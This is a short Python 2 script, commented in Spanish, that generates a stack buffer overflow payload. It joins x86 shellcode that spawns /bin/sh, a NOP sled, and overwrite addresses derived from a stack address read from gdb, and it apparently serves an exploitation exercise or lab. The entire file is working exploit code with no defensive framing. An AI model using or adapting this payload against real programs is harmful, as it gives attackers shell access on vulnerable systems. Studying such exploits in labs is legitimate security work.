#!/bin/python

import sys



shellcode = '\\x31\\xc0\\x83\\xc0\\x0b\\xbb\\x2f\\x73\\x68\\xff\\xc1\\xe3\\x08\\xc1\\xeb\\x08\\x53\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80'
padding = '\\x90'*34 #Nops
buf = int(sys.argv[1], 0) #Pasamos el string de gdb

buf = buf + 0xf0 #El buffer original esta esas posiciones mas arriba
ult = buf + 0x44 #La ultima palabra esta esas posiciones mas arriba

# Necesitamos convertir la direccion en un string como \xc0\xd0\xff\xff

###Ordenamos en little endian y sacamos los caracteres


buf_ft = str("")
ult_ft = str("")
for i in range(4):
	res = 0x000000ff & buf	 	#Usamos una mascara para quedarnos con el ultimo byte
	res2 = 0x000000ff & ult
	
	buf = buf >> 8			#Quitamos el ultimo byte
	ult = ult >> 8
	
	buf_ft = buf_ft + "\\x" + hex(res)[-2:]	#Anadimos el nuevo caracter, quitandole el 0x
	ult_ft = ult_ft + "\\x" + hex(res2)[-2:]

final = shellcode + padding + buf_ft + ult_ft
print final


#buffer_str = hex(buffer)
#otra = str(chr(buffer_str[-2:]))
#print (otra)
#print ('\xc0\xd0\xff\xff')
